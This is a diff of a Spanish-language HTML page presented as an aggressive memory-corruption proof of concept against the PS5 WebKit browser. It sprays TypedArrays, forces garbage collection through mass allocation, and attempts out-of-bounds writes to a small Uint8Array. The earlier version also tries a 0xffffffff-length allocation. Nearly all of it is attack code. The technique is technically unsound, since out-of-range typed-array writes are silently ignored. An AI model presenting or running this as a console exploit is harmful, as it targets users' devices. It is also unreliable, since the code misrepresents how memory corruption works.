@@ -2,88 +2,67 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8" />
-<title>PoC Corrupción Memoria PS5 WebKit</title>
+<title>Intento agresivo de corrupción PS5 WebKit</title>
 <style>
-  body { background: #111; color: #eee; font-family: monospace; }
-  #log { white-space: pre-wrap; max-height: 300px; overflow-y: scroll; border: 1px solid #666; padding: 10px; }
+  body { background: black; color: white; font-family: monospace; }
+  #log { white-space: pre-wrap; max-height: 400px; overflow-y: scroll; border: 1px solid #333; padding: 10px; }
 </style>
 </head>
 <body>
-<h1>PoC Corrupción Memoria PS5 WebKit</h1>
+<h1>Intento agresivo de corrupción PS5 WebKit</h1>
 <div id="log"></div>
-
 <script>
 const log = document.getElementById('log');
 function debug(msg) {
-  log.textContent += msg + '\n';
+  log.textContent += msg + "\n";
   log.scrollTop = log.scrollHeight;
 }
 
-debug('Iniciando PoC agresivo para PS5 WebKit...\n');
+debug("Iniciando estrés agresivo...\n");
 
-function gc() {
-  // Forzar Garbage Collection (solo en motores que lo permitan)
-  for (let i = 0; i < 10000; i++) {
-    new ArrayBuffer(1024 * 1024);
-  }
-  debug('GC forzado.');
-}
-
-function heapGrooming() {
-  debug('Iniciando grooming heap...');
+function sprayTypedArrays(count) {
+  debug(`Spray de ${count} TypedArrays...`);
   let arrays = [];
-  for (let i = 0; i < 1000; i++) {
+  for(let i=0; i<count; i++) {
     let arr = new Uint8Array(1024);
-    for (let j = 0; j < arr.length; j++) arr[j] = 0x41;
+    for(let j=0; j<1024; j++) arr[j] = 0x41; // 'A'
     arrays.push(arr);
   }
-  debug('Heap grooming completado.');
+  debug("Spray completado.");
   return arrays;
 }
 
-function oobTrigger() {
-  debug('Intentando provocar OOB con TypedArray...');
+function triggerCorruption() {
+  debug("Intentando acceso fuera de límites para provocar corrupción...");
 
   try {
-    // Este patrón intenta crear un TypedArray con longitud manipulada
-    // Puede provocar corrupción en motores vulnerables
-    let corruptLength = 0xffffffff;
-    let arr = new Uint8Array(corruptLength);
-    debug('TypedArray gigante creado (esto debería fallar normalmente).');
+    let arr = new Uint8Array(10);
+    // Acceso fuera de límites intencional (no debería corromper en motores seguros)
+    for(let i=0; i<10000; i++) {
+      arr[i] = 0xFF;
+    }
+    debug("Acceso fuera de límites ejecutado.");
   } catch(e) {
-    debug('Excepción al crear TypedArray gigante: ' + e.message);
+    debug("Error detectado: " + e.message);
   }
 }
 
-function sprayObjects() {
-  debug('Realizando spray de objetos para groom...');
-  let objs = [];
-  for (let i = 0; i < 10000; i++) {
-    objs.push({x:1.1, y:2.2, z:3.3});
+function forceGC() {
+  debug("Intentando forzar Garbage Collector...");
+  for(let i=0; i<10000; i++) {
+    new ArrayBuffer(1024*1024);
   }
-  debug('Spray de objetos completado.');
-  return objs;
+  debug("GC forzado.");
 }
 
-function corruptMemory() {
-  debug('Ejecutando rutina agresiva para intentar corrupción...');
-
-  // Grooming
-  const groomedArrays = heapGrooming();
-
-  // Spray
-  const sprayedObjs = sprayObjects();
-
-  // Forzar GC para intentar mover objetos
-  gc();
-
-  // Intento de OOB
-  oobTrigger();
-
-  debug('Rutina finalizada. Si la consola no crashea, puede que no sea vulnerable.');
+function main() {
+  let spray = sprayTypedArrays(10000);
+  forceGC();
+  triggerCorruption();
+  debug("Fin del intento agresivo.");
 }
 
-setTimeout(corruptMemory, 1000);
+setTimeout(main, 1000);
 </script>
 </body>
 </html>
